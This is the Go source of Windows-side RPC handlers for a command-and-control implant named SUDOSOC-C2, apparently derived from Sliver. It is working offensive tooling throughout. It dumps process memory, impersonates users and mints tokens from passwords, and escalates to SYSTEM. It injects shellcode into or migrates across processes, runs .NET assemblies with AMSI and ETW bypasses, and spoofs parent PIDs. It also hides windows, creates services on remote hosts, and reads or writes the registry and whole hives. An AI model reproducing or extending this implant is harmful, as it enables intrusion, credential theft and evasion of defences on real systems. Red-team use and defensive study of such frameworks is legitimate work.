package handlers

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2019  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os/exec"
	"syscall"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/extension"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/mount"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/priv"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/procdump"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/ps"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/registry"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/service"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/spoof"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/syscalls"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/taskrunner"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"
)

var (
	windowsHandlers = map[uint32]RPCHandler{

		// Windows Only
		sudosocpb.MsgTaskReq:                        taskHandler,
		sudosocpb.MsgProcessDumpReq:                 dumpHandler,
		sudosocpb.MsgImpersonateReq:                 impersonateHandler,
		sudosocpb.MsgRevToSelfReq:                   revToSelfHandler,
		sudosocpb.MsgRunAsReq:                       runAsHandler,
		sudosocpb.MsgInvokeGetSystemReq:             getsystemHandler,
		sudosocpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
		sudosocpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
		sudosocpb.MsgInvokeMigrateReq:               migrateHandler,
		sudosocpb.MsgSpawnDllReq:                    spawnDllHandler,
		sudosocpb.MsgStartServiceReq:                startService,
		sudosocpb.MsgStopServiceReq:                 stopService,
		sudosocpb.MsgRemoveServiceReq:               removeService,
		sudosocpb.MsgEnvReq:                         getEnvHandler,
		sudosocpb.MsgSetEnvReq:                      setEnvHandler,
		sudosocpb.MsgUnsetEnvReq:                    unsetEnvHandler,
		sudosocpb.MsgExecuteWindowsReq:              executeWindowsHandler,
		sudosocpb.MsgGetPrivsReq:                    getPrivsHandler,
		sudosocpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
		sudosocpb.MsgRegistryReadHiveReq:            regReadHiveHandler,

		// Platform specific
		sudosocpb.MsgIfconfigReq:            ifconfigHandler,
		sudosocpb.MsgScreenshotReq:          screenshotHandler,
		sudosocpb.MsgSideloadReq:            sideloadHandler,
		sudosocpb.MsgNetstatReq:             netstatHandler,
		sudosocpb.MsgMakeTokenReq:           makeTokenHandler,
		sudosocpb.MsgPsReq:                  psHandler,
		sudosocpb.MsgTerminateReq:           terminateHandler,
		sudosocpb.MsgRegistryReadReq:        regReadHandler,
		sudosocpb.MsgRegistryWriteReq:       regWriteHandler,
		sudosocpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
		sudosocpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
		sudosocpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
		sudosocpb.MsgRegistryListValuesReq:  regValuesListHandler,
		sudosocpb.MsgServicesReq:            servicesListHandler,
		sudosocpb.MsgServiceDetailReq:       serviceDetailHandler,
		sudosocpb.MsgStartServiceByNameReq:  startServiceByNameHandler,
		sudosocpb.MsgMountReq:               mountHandler,

		// Generic
		sudosocpb.MsgPing:               pingHandler,
		sudosocpb.MsgLsReq:              dirListHandler,
		sudosocpb.MsgDownloadReq:        downloadHandler,
		sudosocpb.MsgUploadReq:          uploadHandler,
		sudosocpb.MsgCdReq:              cdHandler,
		sudosocpb.MsgPwdReq:             pwdHandler,
		sudosocpb.MsgRmReq:              rmHandler,
		sudosocpb.MsgMvReq:              mvHandler,
		sudosocpb.MsgCpReq:              cpHandler,
		sudosocpb.MsgMkdirReq:           mkdirHandler,
		sudosocpb.MsgExecuteReq:         executeHandler,
		sudosocpb.MsgExecuteChildrenReq: executeChildrenHandler,
		sudosocpb.MsgReconfigureReq:     reconfigureHandler,
		sudosocpb.MsgSSHCommandReq:      runSSHCommandHandler,
		sudosocpb.MsgChtimesReq:         chtimesHandler,
		sudosocpb.MsgGrepReq:            grepHandler,

		// Extensions
		sudosocpb.MsgRegisterExtensionReq: registerExtensionHandler,
		sudosocpb.MsgCallExtensionReq:     callExtensionHandler,
		sudosocpb.MsgListExtensionsReq:    listExtensionsHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		sudosocpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		sudosocpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		sudosocpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,

		// {{if .Config.IncludeWG}}
		// Wireguard specific
		sudosocpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sudosocpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sudosocpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sudosocpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sudosocpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sudosocpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}
)

// GetSystemHandlers - Returns a map of the windows system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return windowsHandlers
}

func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
	if priv.CurrentToken != 0 {
		err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
	}
	handler(data, resp)
	if priv.CurrentToken != 0 {
		err := priv.TRevertToSelf()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error: %v\n", err)
			// {{end}}
		}
	}
}

// ---------------- Windows Handlers ----------------

func dumpHandler(data []byte, resp RPCResponse) {
	procDumpReq := &sudosocpb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	res, err := procdump.DumpProcess(procDumpReq.Pid)
	dumpResp := &sudosocpb.ProcessDump{Data: res.Data()}
	if err != nil {
		dumpResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}
	data, err = proto.Marshal(dumpResp)
	resp(data, err)
}

func taskHandler(data []byte, resp RPCResponse) {
	var err error
	task := &sudosocpb.TaskReq{}
	err = proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	if task.Pid == 0 {
		err = taskrunner.LocalTask(task.Data, task.RWXPages)
	} else {
		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
	}
	resp([]byte{}, err)
}

func impersonateHandler(data []byte, resp RPCResponse) {
	impersonateReq := &sudosocpb.ImpersonateReq{}
	err := proto.Unmarshal(data, impersonateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	token, err := priv.Impersonate(impersonateReq.Username)
	if err == nil {
		taskrunner.CurrentToken = token
	}
	impersonate := &sudosocpb.Impersonate{}
	if err != nil {
		impersonate.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(impersonate)
	resp(data, err)
}

func runAsHandler(data []byte, resp RPCResponse) {
	runAsReq := &sudosocpb.RunAsReq{}
	err := proto.Unmarshal(data, runAsReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	show := 10
	if runAsReq.HideWindow {
		show = 0
	}
	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
	runAs := &sudosocpb.RunAs{}
	if err != nil {
		runAs.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(runAs)
	resp(data, err)
}

func revToSelfHandler(_ []byte, resp RPCResponse) {
	//{{if .Config.Debug}}
	log.Println("Calling revToSelf...")
	//{{end}}
	taskrunner.CurrentToken = windows.Token(0)
	err := priv.RevertToSelf()
	revToSelf := &sudosocpb.RevToSelf{}
	if err != nil {
		revToSelf.Response = &commonpb.Response{Err: err.Error()}
	}
	//{{if .Config.Debug}}
	log.Println("revToSelf done!")
	//{{end}}
	data, err := proto.Marshal(revToSelf)
	resp(data, err)
}

func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
	tokOwnReq := &sudosocpb.CurrentTokenOwnerReq{}
	err := proto.Unmarshal(data, tokOwnReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	getCT := &sudosocpb.CurrentTokenOwner{}
	owner, err := priv.CurrentTokenOwner()
	if err != nil {
		getCT.Response = &commonpb.Response{Err: err.Error()}
	}
	getCT.Output = owner
	data, err = proto.Marshal(getCT)
	resp(data, err)
}

func getsystemHandler(data []byte, resp RPCResponse) {
	getSysReq := &sudosocpb.InvokeGetSystemReq{}
	err := proto.Unmarshal(data, getSysReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
	getSys := &sudosocpb.GetSystem{}
	if err != nil {
		getSys.Response = &commonpb.Response{Err: err.Error()}
	}
	data, err = proto.Marshal(getSys)
	resp(data, err)
}

func executeAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &sudosocpb.InvokeExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
	execAsm := &sudosocpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)

}

func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
	execReq := &sudosocpb.InvokeInProcExecuteAssemblyReq{}
	err := proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
	execAsm := &sudosocpb.ExecuteAssembly{Output: []byte(output)}
	if err != nil {
		execAsm.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(execAsm)
	resp(data, err)
}

func executeWindowsHandler(data []byte, resp RPCResponse) {
	var (
		err       error
		stdErr    io.Writer
		stdOut    io.Writer
		errWriter *bufio.Writer
		outWriter *bufio.Writer
	)
	execReq := &sudosocpb.ExecuteWindowsReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &sudosocpb.Execute{}
	exePath, err := expandPath(execReq.Path)
	if err != nil {
		execResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	cmd := exec.Command(exePath, execReq.Args...)

	// Execute with current token
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	if execReq.UseToken {
		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
	}
	// Hide the window if requested
	cmd.SysProcAttr.HideWindow = execReq.HideWindow
	if execReq.PPid != 0 {
		err := spoof.SpoofParent(execReq.PPid, cmd)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("could not spoof parent PID: %v\n", err)
			// {{end}}
		}
	}

	if execReq.Output && !execReq.Background {
		stdOutBuff := new(bytes.Buffer)
		stdErrBuff := new(bytes.Buffer)
		stdErr = stdErrBuff
		stdOut = stdOutBuff
		if execReq.Stderr != "" {
			stdErrFile, err := os.Create(execReq.Stderr)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdErrFile.Close()
			errWriter = bufio.NewWriter(stdErrFile)
			stdErr = io.MultiWriter(errWriter, stdErrBuff)
		}
		if execReq.Stdout != "" {
			stdOutFile, err := os.Create(execReq.Stdout)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdOutFile.Close()
			outWriter = bufio.NewWriter(stdOutFile)
			stdOut = io.MultiWriter(outWriter, stdOutBuff)
		}
		cmd.Stdout = stdOut
		cmd.Stderr = stdErr
		err := cmd.Run()
		//{{if .Config.Debug}}
		log.Println(string(stdOutBuff.String()))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		if errWriter != nil {
			errWriter.Flush()
		}
		if outWriter != nil {
			outWriter.Flush()
		}
		execResp.Stderr = stdErrBuff.Bytes()
		execResp.Stdout = stdOutBuff.Bytes()
		if cmd.Process != nil {
			execResp.Pid = uint32(cmd.Process.Pid)
		}
	} else {
		pid, startErr := startExecuteChild(cmd, execReq.Background, exePath, execReq.Args, execReq.Stdout, execReq.Stderr)
		if startErr != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", startErr),
			}
		}
		if pid != 0 {
			execResp.Pid = uint32(pid)
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func migrateHandler(data []byte, resp RPCResponse) {
	// {{if .Config.Debug}}
	log.Println("migrateHandler: RemoteTask called")
	// {{end}}
	migrateReq := &sudosocpb.InvokeMigrateReq{}
	var migrateResp sudosocpb.Migrate = sudosocpb.Migrate{}
	err := proto.Unmarshal(data, migrateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	if migrateReq.Pid == 0 {
		if migrateReq.ProcName == "" {
			// {{if .Config.Debug}}
			log.Println("pid nor process name were specified")
			// {{end}}
			migrateResp.Success = false
			migrateResp.Response = &commonpb.Response{}
		} else {
			// Search for the PID, do not need all info about the process
			processes, err := ps.Processes(false)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("failed to list procs %v", err)
				// {{end}}
				migrateResp.Success = false
				migrateResp.Response = &commonpb.Response{}
			} else {
				for _, proc := range processes {
					if strings.EqualFold(proc.Executable(), migrateReq.ProcName) {
						migrateReq.Pid = uint32(proc.Pid())
						break
					}
				}
				if migrateReq.Pid == 0 {
					// If the Pid is still zero after grabbing a list of processes, then the process name does not exist
					// {{if .Config.Debug}}
					log.Printf("Could not find process with name %s", migrateReq.ProcName)
					// {{end}}
					migrateResp.Success = false
					migrateResp.Response = &commonpb.Response{}
				}
			}
		}
	}

	if migrateResp.Response == nil {
		err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
		// {{if .Config.Debug}}
		log.Println("migrateHandler: RemoteTask called")
		// {{end}}
		migrateResp = sudosocpb.Migrate{Success: true, Pid: migrateReq.Pid}
		if err != nil {
			migrateResp.Success = false
			migrateResp.Response = &commonpb.Response{
				Err: err.Error(),
			}
			// {{if .Config.Debug}}
			log.Println("migrateHandler: RemoteTask failed:", err)
			// {{end}}
		}
	}

	data, err = proto.Marshal(&migrateResp)
	resp(data, err)
}

func spawnDllHandler(data []byte, resp RPCResponse) {
	spawnReq := &sudosocpb.SpawnDllReq{}
	err := proto.Unmarshal(data, spawnReq)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	//{{if .Config.Debug}}
	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
	//{{end}}
	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
	spawnResp := &sudosocpb.SpawnDll{Result: result}
	if err != nil {
		spawnResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(spawnResp)
	resp(data, err)
}

func makeTokenHandler(data []byte, resp RPCResponse) {
	makeTokenReq := &sudosocpb.MakeTokenReq{}
	err := proto.Unmarshal(data, makeTokenReq)
	if err != nil {
		return
	}
	makeTokenResp := &sudosocpb.MakeToken{}
	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
	if err != nil {
		makeTokenResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(makeTokenResp)
	resp(data, err)
}

func startService(data []byte, resp RPCResponse) {
	startService := &sudosocpb.StartServiceReq{}
	err := proto.Unmarshal(data, startService)
	if err != nil {
		return
	}
	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
	startServiceResp := &sudosocpb.ServiceInfo{}
	if err != nil {
		startServiceResp.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(startServiceResp)
	resp(data, err)
}

func stopService(data []byte, resp RPCResponse) {
	stopServiceReq := &sudosocpb.StopServiceReq{}
	err := proto.Unmarshal(data, stopServiceReq)
	if err != nil {
		return
	}
	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sudosocpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func startServiceByNameHandler(data []byte, resp RPCResponse) {
	startServiceReq := &sudosocpb.StartServiceByNameReq{}
	err := proto.Unmarshal(data, startServiceReq)
	if err != nil {
		return
	}

	err = service.StartServiceByName(startServiceReq.ServiceInfo.Hostname, startServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sudosocpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func removeService(data []byte, resp RPCResponse) {
	removeServiceReq := &sudosocpb.RemoveServiceReq{}
	err := proto.Unmarshal(data, removeServiceReq)
	if err != nil {
		return
	}
	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
	svcInfo := &sudosocpb.ServiceInfo{}
	if err != nil {
		svcInfo.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(svcInfo)
	resp(data, err)
}

func regWriteHandler(data []byte, resp RPCResponse) {
	regWriteReq := &sudosocpb.RegistryWriteReq{}
	err := proto.Unmarshal(data, regWriteReq)
	if err != nil {
		return
	}
	var val interface{}
	switch regWriteReq.Type {
	case sudosocpb.RegistryTypeBinary:
		val = regWriteReq.ByteValue
	case sudosocpb.RegistryTypeDWORD:
		val = regWriteReq.DWordValue
	case sudosocpb.RegistryTypeQWORD:
		val = regWriteReq.QWordValue
	case sudosocpb.RegistryTypeString:
		val = regWriteReq.StringValue
	default:
		return
	}
	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
	regWriteResp := &sudosocpb.RegistryWrite{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regWriteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regWriteResp)
	resp(data, err)
}

func regReadHandler(data []byte, resp RPCResponse) {
	regReadReq := &sudosocpb.RegistryReadReq{}
	err := proto.Unmarshal(data, regReadReq)
	if err != nil {
		return
	}
	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
	regReadResp := &sudosocpb.RegistryRead{
		Value:    res,
		Response: &commonpb.Response{},
	}
	if err != nil {
		regReadResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(regReadResp)
	resp(data, err)
}

func regCreateKeyHandler(data []byte, resp RPCResponse) {
	createReq := &sudosocpb.RegistryCreateKeyReq{}
	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}
	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
	createResp := &sudosocpb.RegistryCreateKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		createResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(createResp)
	resp(data, err)
}

func regDeleteKeyHandler(data []byte, resp RPCResponse) {
	deleteReq := &sudosocpb.RegistryDeleteKeyReq{}
	err := proto.Unmarshal(data, deleteReq)
	if err != nil {
		return
	}
	err = registry.DeleteKey(deleteReq.Hostname, deleteReq.Hive, deleteReq.Path, deleteReq.Key)
	deleteResp := &sudosocpb.RegistryDeleteKey{
		Response: &commonpb.Response{},
	}
	if err != nil {
		deleteResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(deleteResp)
	resp(data, err)
}

func regSubKeysListHandler(data []byte, resp RPCResponse) {
	listReq := &sudosocpb.RegistrySubKeyListReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	subKeys, err := registry.ListSubKeys(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &sudosocpb.RegistrySubKeyList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.Subkeys = subKeys
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func regValuesListHandler(data []byte, resp RPCResponse) {
	listReq := &sudosocpb.RegistryListValuesReq{}
	err := proto.Unmarshal(data, listReq)
	if err != nil {
		return
	}
	regValues, err := registry.ListValues(listReq.Hostname, listReq.Hive, listReq.Path)
	regListResp := &sudosocpb.RegistryValuesList{
		Response: &commonpb.Response{},
	}
	if err != nil {
		regListResp.Response.Err = err.Error()
	} else {
		regListResp.ValueNames = regValues
	}
	data, err = proto.Marshal(regListResp)
	resp(data, err)
}

func regReadHiveHandler(data []byte, resp RPCResponse) {
	hiveReq := &sudosocpb.RegistryReadHiveReq{}
	err := proto.Unmarshal(data, hiveReq)
	if err != nil {
		return
	}
	hiveResp := &sudosocpb.RegistryReadHive{
		Response: &commonpb.Response{},
	}
	hiveData, err := registry.ReadHive(hiveReq.RootHive, hiveReq.RequestedHive)
	if err != nil {
		hiveResp.Response.Err = err.Error()
	}
	// We might not have a fatal error, so whatever the result (nil or not), assign .Data to it
	gzipData := bytes.NewBuffer([]byte{})
	gzipWrite(gzipData, hiveData)
	hiveResp.Data = gzipData.Bytes()
	hiveResp.Encoder = "gzip"
	data, err = proto.Marshal(hiveResp)
	resp(data, err)
}

func getPrivsHandler(data []byte, resp RPCResponse) {
	createReq := &sudosocpb.GetPrivsReq{}

	err := proto.Unmarshal(data, createReq)
	if err != nil {
		return
	}

	privsInfo, integrity, processName, err := priv.GetPrivs()

	response_data := make([]*sudosocpb.WindowsPrivilegeEntry, len(privsInfo))

	/*
		Translate the PrivilegeInfo structs into
		sudosocpb.WindowsPrivilegeEntry structs and put them in the data
		that will go back to the server / client
	*/
	for index, entry := range privsInfo {
		var currentEntry sudosocpb.WindowsPrivilegeEntry

		currentEntry.Name = entry.Name
		currentEntry.Description = entry.Description
		currentEntry.Enabled = entry.Enabled
		currentEntry.EnabledByDefault = entry.EnabledByDefault
		currentEntry.Removed = entry.Removed
		currentEntry.UsedForAccess = entry.UsedForAccess

		response_data[index] = &currentEntry
	}

	// Package up the response
	getPrivsResp := &sudosocpb.GetPrivs{
		PrivInfo:         response_data,
		ProcessIntegrity: integrity,
		ProcessName:      processName,
		Response:         &commonpb.Response{},
	}

	if err != nil {
		getPrivsResp.Response.Err = err.Error()
	}

	data, err = proto.Marshal(getPrivsResp)
	resp(data, err)
}

func servicesListHandler(data []byte, resp RPCResponse) {
	servicesReq := &sudosocpb.ServicesReq{}
	err := proto.Unmarshal(data, servicesReq)
	if err != nil {
		return
	}

	serviceInfo, err := service.ListServices(servicesReq.Hostname)
	servicesResp := buildServicesResp(serviceInfo, err)

	data, err = proto.Marshal(servicesResp)
	resp(data, err)
}

// buildServicesResp packages the result of service.ListServices into a
// sudosocpb.Services response.  Errors from listing services are not fatal
// (partial results may still be useful to the operator), so a non-nil error
// is reported via the Error string field rather than failing the RPC.
// The nil-check is load-bearing: callers previously called err.Error()
// unconditionally, crashing the implant when ListServices succeeded cleanly.
func buildServicesResp(details []*sudosocpb.ServiceDetails, err error) *sudosocpb.Services {
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	return &sudosocpb.Services{
		Details:  details,
		Error:    errStr,
		Response: &commonpb.Response{},
	}
}

func serviceDetailHandler(data []byte, resp RPCResponse) {
	serviceDetailReq := &sudosocpb.ServiceDetailReq{}
	err := proto.Unmarshal(data, serviceDetailReq)
	if err != nil {
		return
	}

	serviceDetail, err := service.GetServiceDetail(serviceDetailReq.ServiceInfo.Hostname, serviceDetailReq.ServiceInfo.ServiceName)
	serviceDetailResp := &sudosocpb.ServiceDetail{
		Detail:   serviceDetail,
		Response: &commonpb.Response{},
	}
	if err != nil {
		if serviceDetail != nil {
			// Then we had a non-fatal error
			serviceDetailResp.Message = err.Error()
		} else {
			serviceDetailResp.Response.Err = err.Error()
		}
	}

	data, err = proto.Marshal(serviceDetailResp)
	resp(data, err)
}

func mountHandler(data []byte, resp RPCResponse) {
	mountReq := &sudosocpb.MountReq{}

	err := proto.Unmarshal(data, mountReq)
	if err != nil {
		return
	}
	mountData, err := mount.GetMountInformation()
	mountResp := &sudosocpb.Mount{
		Info:     mountData,
		Response: &commonpb.Response{},
	}

	if err != nil {
		mountResp.Response.Err = err.Error()
	}

	data, err = proto.Marshal(mountResp)
	resp(data, err)
}

// Extensions

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerReq := &sudosocpb.RegisterExtensionReq{}
	err := proto.Unmarshal(data, registerReq)
	if err != nil {
		return
	}
	ext := extension.NewWindowsExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	err = ext.Load()
	registerResp := &sudosocpb.RegisterExtension{Response: &commonpb.Response{}}
	if err != nil {
		registerResp.Response.Err = err.Error()
	} else {
		extension.Add(ext)
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &sudosocpb.CallExtensionReq{}
	err := proto.Unmarshal(data, callReq)
	if err != nil {
		return
	}

	callResp := &sudosocpb.CallExtension{Response: &commonpb.Response{}}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err = proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &sudosocpb.ListExtensionsReq{}
	err := proto.Unmarshal(data, lstReq)
	if err != nil {
		return
	}

	exts := extension.List()
	lstResp := &sudosocpb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err = proto.Marshal(lstResp)
	resp(data, err)
}

// Stub since Windows doesn't support UID
func getUid(fileInfo os.FileInfo) string {
	return ""
}

// Stub since Windows doesn't support GID
func getGid(fileInfo os.FileInfo) string {
	return ""
}
